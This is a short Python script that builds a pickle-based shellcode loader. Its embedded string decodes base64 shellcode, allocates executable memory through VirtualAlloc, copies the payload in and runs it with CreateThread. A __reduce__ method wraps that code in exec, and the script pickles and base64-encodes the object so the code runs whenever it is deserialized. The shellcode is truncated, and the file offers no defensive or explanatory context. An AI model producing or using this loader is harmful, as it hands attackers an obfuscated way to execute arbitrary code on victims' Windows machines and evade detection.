import pickle
import base64

shellcodeloader = """
import ctypes,base64,time

#这里不能直接存在空字节，反序列化的时候会出错，所以要处理一下
shellcode = base64.b64decode(b'/EiD5PDoyAA...')
shellcode = codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),  
    ctypes.c_int(0x40) 
    )

buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0)) 
)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""

class AAA(object):
    def __reduce__(self):
        return (exec, (shellcodeloader,))

seri = pickle.dumps(AAA())
seri_base64 = base64.b64encode(seri)
print(seri_base64)